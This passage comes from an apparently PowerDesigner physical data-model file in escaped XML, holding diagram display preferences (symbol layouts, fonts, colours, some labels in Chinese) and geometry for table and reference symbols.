Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Relationship.Entity1ToEntity2Role=YesRelationship.Entity2ToEntity1RoleCardinality=NoRelationship.Entity1ToEntity2RoleDominant=YesRelationship.Stereotype=YesRelationship.DisplayName=YesRelationship.JoinExpression=NoRelationship.Entity2ToEntity1Role=YesRelationship.Entity1ToEntity2RoleCardinality=NoRelationship.Entity2ToEntity1RoleDominant=YesRelationship_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity1ToEntity2Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Entity2ToEntity1Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Role&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;Entity1ToEntity2RoleCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Dominance&amp;quot; Attribute=&amp;quot;Entity2ToEntity1RoleDominant&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Dominance&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Inheritance.Stereotype=YesInheritance.DisplayName=YesInheritance.IconPicture=NoInheritance.TextStyle=NoInheritance_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;Entity.SubSymbols=YesAssociation.Stereotype=YesAssociation.Comment=NoAssociation.Attributes=YesAssociation.Attributes._Columns=Stereotype DomainOrDataType NullIndicatorAssociation.Attributes._Limit=-5Association.IconPicture=NoAssociation.TextStyle=NoAssociation_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;名称&amp;quot; Attribute=&amp;quot;DisplayName&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;Separator Name=&amp;quot;Separator&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Comment&amp;quot; Attribute=&amp;quot;Comment&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;LEFT&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardCollection Name=&amp;quot;Attributes&amp;quot; Collection=&amp;quot;Attributes&amp;quot; Columns=&amp;quot;Stereotype No\\r\\nDisplayName Yes\\r\\nDataType No\\r\\nDomainOrDataType No 域或数据类型\\r\\nDomain No\\r\\nNullIndicator No 强制性&amp;quot; HasLimit=&amp;quot;Yes&amp;quot; HideEmpty=&amp;quot;No&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Icon&amp;quot; Attribute=&amp;quot;IconPicture&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;强制顶部对齐&amp;quot; Attribute=&amp;quot;TextStyle&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Alignment=&amp;quot;CNTR&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;Yes&amp;quot; /&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;AssociationLink.SymbolCardinality=YesAssociationLink.Stereotype=YesAssociationLink.Role=YesAssociationLink_SymbolLayout=&amp;lt;Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;源&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Cardinality&amp;quot; Attribute=&amp;quot;SymbolCardinality&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;Cardinality&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;居中&amp;quot; &amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;构造型&amp;quot; Attribute=&amp;quot;Stereotype&amp;quot; Prefix=&amp;quot;&amp;amp;lt;&amp;amp;lt;&amp;quot; Suffix=&amp;quot;&amp;amp;gt;&amp;amp;gt;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;StandardAttribute Name=&amp;quot;Role&amp;quot; Attribute=&amp;quot;Role&amp;quot; Prefix=&amp;quot;&amp;quot; Suffix=&amp;quot;&amp;quot; Caption=&amp;quot;&amp;quot; Mandatory=&amp;quot;No&amp;quot; /&amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF] &amp;lt;Form Name=&amp;quot;Destination&amp;quot; &amp;gt;[CRLF] &amp;lt;/Form&amp;gt;[CRLF]&amp;lt;/Form&amp;gt;[DisplayPreferences\\Symbol][DisplayPreferences\\Symbol\\FRMEOBJ]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=6000Height=2000Brush color=255 255 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=64Brush gradient color=192 192 192Brush background image=Custom shape=Custom text mode=0Pen=1 0 255 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FRMELNK]CENTERFont=Arial,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\USRDEPD]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=2 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\FILO]OBJSTRNFont=新宋体,8,NOBJSTRNFont color=0 0 0DISPNAMEFont=新宋体,8,NDISPNAMEFont color=0 0 0LCNMFont=新宋体,8,NLCNMFont color=0 0 0AutoAdjustToText=YesKeep aspect=YesKeep center=YesKeep size=NoWidth=2400Height=2400Brush color=255 255 255Fill Color=NoBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 0 0 255Shadow color=192 192 192Shadow=-1[DisplayPreferences\\Symbol\\PDMPCKG]STRNFont=Arial,8,NSTRNFont color=0, 0, 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0, 0, 0LABLFont=Arial,8,NLABLFont color=0, 0, 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\TABL]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0ColumnsFont=Arial,8,NColumnsFont color=0 0 0TablePkColumnsFont=Arial,8,UTablePkColumnsFont color=0 0 0TableFkColumnsFont=Arial,8,NTableFkColumnsFont color=0 0 0KeysFont=Arial,8,NKeysFont color=0 0 0IndexesFont=Arial,8,NIndexesFont color=0 0 0TriggersFont=Arial,8,NTriggersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=210 137 2Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\VIEW]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0ColumnsFont=Arial,8,NColumnsFont color=0 0 0TablePkColumnsFont=新宋体,8,UTablePkColumnsFont color=0, 0, 0TableFkColumnsFont=新宋体,8,NTableFkColumnsFont color=0, 0, 0TemporaryVTablesFont=Arial,8,NTemporaryVTablesFont color=0 0 0IndexesFont=Arial,8,NIndexesFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 128Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\PROC]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0OWNRDISPNAMEFont=新宋体,8,NOWNRDISPNAMEFont color=0, 0, 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4000Height=1000Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 108 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\REFR]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\VREF]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\Free Symbol]Free TextFont=Arial,8,NFree TextFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=新宋体,8,UEntityPrimaryAttributeFont color=0, 0, 0EntityForeignAttributeFont=新宋体,8,NEntityForeignAttributeFont color=0, 0, 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=234 181 21Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMRLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0, 0, 0CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMINHR]STRNFont=新宋体,8,NSTRNFont color=0, 0, 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=250 241 211Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LDMLINH]CENTERFont=新宋体,8,NCENTERFont color=0, 0, 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 64 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\CDMPCKG]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3600Brush color=255 255 192Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 178 178 178Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ENTT]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=Arial,8,UEntityPrimaryAttributeFont color=0 0 0IdentifiersFont=Arial,8,NIdentifiersFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=4000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\RLSH]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0DESTINATIONFont=新宋体,8,NDESTINATIONFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 64Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\ASSC]STRNFont=Arial,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0LABLFont=Arial,8,NLABLFont color=0 0 0AttributesFont=Arial,8,NAttributesFont color=0 0 0EntityPrimaryAttributeFont=新宋体,8,UEntityPrimaryAttributeFont color=0 0 0AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoWidth=4800Height=3000Brush color=208 208 255Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINK]SOURCEFont=新宋体,8,NSOURCEFont color=0 0 0CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 128 255Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\CDMINHR]STRNFont=新宋体,8,NSTRNFont color=0 0 0DISPNAMEFont=Arial,8,NDISPNAMEFont color=0 0 0AutoAdjustToText=NoKeep aspect=NoKeep center=NoKeep size=YesWidth=1575Height=1000Brush color=233 202 131Fill Color=YesBrush style=6Brush bitmap mode=12Brush gradient mode=65Brush gradient color=255 255 255Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\Symbol\\LINH]CENTERFont=新宋体,8,NCENTERFont color=0 0 0Line style=2AutoAdjustToText=YesKeep aspect=NoKeep center=NoKeep size=NoBrush color=255 255 255Fill Color=YesBrush style=1Brush bitmap mode=12Brush gradient mode=0Brush gradient color=118 118 118Brush background image=Custom shape=Custom text mode=0Pen=1 0 128 0 0Shadow color=192 192 192Shadow=0[DisplayPreferences\\LDM][DisplayPreferences\\CDM]&lt;/a:DisplayPreferences&gt;&lt;a:PaperSize&gt;(8268, 11693)&lt;/a:PaperSize&gt;&lt;a:PageMargins&gt;((315,354), (433,354))&lt;/a:PageMargins&gt;&lt;a:PageOrientation&gt;1&lt;/a:PageOrientation&gt;&lt;a:PaperSource&gt;15&lt;/a:PaperSource&gt;&lt;c:Symbols&gt;&lt;o:ReferenceSymbol Id=&quot;o6&quot;&gt;&lt;a:ModificationDate&gt;1618333929&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((-24070,-20453), (6283,-1236))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((5883,-19553),(-18190,-19553),(-18190,-1636))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;2&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o7&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o8&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o9&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:ReferenceSymbol Id=&quot;o10&quot;&gt;&lt;a:ModificationDate&gt;1618333929&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((3821,-16294), (16001,-3667))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((9911,-15894),(9911,-4067))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o7&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o11&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o12&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:ReferenceSymbol Id=&quot;o13&quot;&gt;&lt;a:ModificationDate&gt;1618333906&lt;/a:ModificationDate&gt;&lt;a:Rect&gt;((9661,-1158), (25689,14173))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((10061,-258),(19599,-258),(19599,13773))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;a:AutomaticRoutingState&gt;4&lt;/a:AutomaticRoutingState&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o11&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o14&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o15&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:ReferenceSymbol Id=&quot;o16&quot;&gt;&lt;a:Rect&gt;((-24840,-776), (-10860,14605))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-11260,14205),(-18750,14205),(-18750,6409),(-18843,6409),(-18843,-376))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o17&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o8&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o18&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:ReferenceSymbol Id=&quot;o19&quot;&gt;&lt;a:Rect&gt;((-13132,-1033), (10311,14755))&lt;/a:Rect&gt;&lt;a:ListOfPoints&gt;((-11110,14355),(-6832,14355),(-6832,-408),(9911,-408))&lt;/a:ListOfPoints&gt;&lt;a:CornerStyle&gt;2&lt;/a:CornerStyle&gt;&lt;a:ArrowStyle&gt;1&lt;/a:ArrowStyle&gt;&lt;a:LineColor&gt;4194432&lt;/a:LineColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;CENTER 0 新宋体,8,NSOURCE 0 新宋体,8,NDESTINATION 0 新宋体,8,N&lt;/a:FontList&gt;&lt;c:SourceSymbol&gt;&lt;o:TableSymbol Ref=&quot;o17&quot;/&gt;&lt;/c:SourceSymbol&gt;&lt;c:DestinationSymbol&gt;&lt;o:TableSymbol Ref=&quot;o11&quot;/&gt;&lt;/c:DestinationSymbol&gt;&lt;c:Object&gt;&lt;o:Reference Ref=&quot;o20&quot;/&gt;&lt;/c:Object&gt;&lt;/o:ReferenceSymbol&gt;&lt;o:TableSymbol Id=&quot;o8&quot;&gt;&lt;a:IconMode&gt;-1&lt;/a:IconMode&gt;&lt;a:Rect&gt;((-20432,-1894), (-15632,2544))&lt;/a:Rect&gt;&lt;a:AutoAdjustToText&gt;0&lt;/a:AutoAdjustToText&gt;&lt;a:LineColor&gt;4227200&lt;/a:LineColor&gt;&lt;a:FillColor&gt;8637161&lt;/a:FillColor&gt;&lt;a:ShadowColor&gt;12632256&lt;/a:ShadowColor&gt;&lt;a:FontList&gt;STRN 0 Arial,8,NDISPNAME 0 Arial,8,NOWNRDISPNAME 0 Arial,8,NColumns 0 Arial,8,NTablePkColumns 0 Arial,8,UTableFkColumns 0 Arial,8,NKeys 0 Arial,8,NIndexes 0 Arial,8,NTriggers 0 Arial,8,NLABL 0 